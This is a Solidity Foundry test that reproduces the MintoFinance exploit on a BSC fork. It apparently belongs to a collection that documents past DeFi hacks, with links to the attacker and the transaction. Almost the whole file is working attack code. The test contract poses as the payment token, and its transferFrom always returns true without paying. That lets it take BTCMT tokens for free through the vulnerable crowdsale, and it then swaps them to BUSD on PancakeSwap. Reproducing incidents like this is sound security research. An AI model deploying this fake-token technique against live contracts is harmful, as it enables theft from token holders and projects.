// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~9k US$
// Attacker :  https://bscscan.com/address/0xc5001f60db92afcc23177a6c6b440a4226cb58bf
// Attack Contract : https://bscscan.com/address/0xba91db0b31d60c45e0b03e6d515e45fcabc7b1cd
// Vulnerable Contract :https://bscscan.com/address/0xdbf1c56b2ad121fe705f9b68225378aa6784f3e5
// Attack Tx :https://explorer.phalcon.xyz/tx/bsc/0x53be95dc8ffbc80060215133f76f48df35deef3cd7e1803e24b1e2f8aa53440b
// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x0d116ed40831fef8e21ece57c8455ae3b1e4041b#code
// @Analysis
// Twitter Guy : https://twitter.com/bbbb/status/1683180340548890631?s=20
interface ReferalCrowdSales {
    struct LinkParameters {
        bytes32 linkHash;
        address linkFather;
        address linkSon;
        uint256 fatherPercent;
        bytes linkSignature;
    }

    struct PurchaseParameters {
        bool give;
        bool lockedPurchase;
        address paymentToken;
        uint256 usdtAmount;
        uint256 btcmtAmount;
        uint256 lockIndex;
        uint256 expirationTime;
        bytes buySignature;
    }

    function buyTokens(LinkParameters memory linkParams, PurchaseParameters memory purchaseParams) external;
}

interface PancakeRouter3 {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams memory params) external payable returns (uint256 amountOut);
}

contract MintoFinance_exp is Test {
    address constant BUSD = 0x55d398326f99059fF775485246999027B3197955; //correct
    IERC20 BTCMT;

    function setUp() public {
        vm.createSelectFork("bsc", 30_214_253);
        BTCMT = IERC20(0x410a56541bD912F9B60943fcB344f1E3D6F09567);
    }

    function testExploit() external {
        console.log("BTCMT balance before the Exploit", BTCMT.balanceOf(address(this)));
        ReferalCrowdSales.LinkParameters memory linkParams;
        ReferalCrowdSales.PurchaseParameters memory purchaseParams;
        linkParams.linkHash = 0xc69c51e039668f688f28f427c63cd60aa986f8ce1546039e6a302fb721473814;
        linkParams.linkFather = 0x0000000000000000000000000000000000000000;
        linkParams.linkSon = 0x0000000000000000000000000000000000000000;
        linkParams.fatherPercent = 0;
        linkParams.linkSignature = "";
        purchaseParams.give = false;
        purchaseParams.lockedPurchase = false;
        purchaseParams.paymentToken = address(this);
        purchaseParams.usdtAmount = 12_100e18;
        purchaseParams.btcmtAmount = 0;
        purchaseParams.expirationTime = 0;
        purchaseParams.buySignature = "";

        ReferalCrowdSales(0xDbF1C56b2aD121Fe705f9b68225378aa6784f3e5).buyTokens(linkParams, purchaseParams);
        uint256 balance = BTCMT.balanceOf(address(this));
        console.log("BTCMT balance after the Exploit", balance);
        console.log("Swap BTCMT -> BUSD through pancakeSwap");
        BTCMT.approve(0x13f4EA83D0bd40E75C8222255bc855a974568Dd4, type(uint256).max);

        PancakeRouter3.ExactInputSingleParams memory inputparams;
        inputparams.tokenIn = address(BTCMT);
        inputparams.tokenOut = BUSD;
        inputparams.fee = uint24(100);
        inputparams.recipient = address(this);
        inputparams.amountIn = balance;
        inputparams.amountOutMinimum = uint256(0);
        inputparams.sqrtPriceLimitX96 = uint160(0);
        PancakeRouter3(0x13f4EA83D0bd40E75C8222255bc855a974568Dd4).exactInputSingle(inputparams);
        uint256 bUSDBalance = IERC20(BUSD).balanceOf(address(this));
        console.log("BUSD balance after the Exploit", bUSDBalance);
    }

    function transferFrom(address a, address b, uint256 amount) external returns (bool) {
        return true;
    }
}
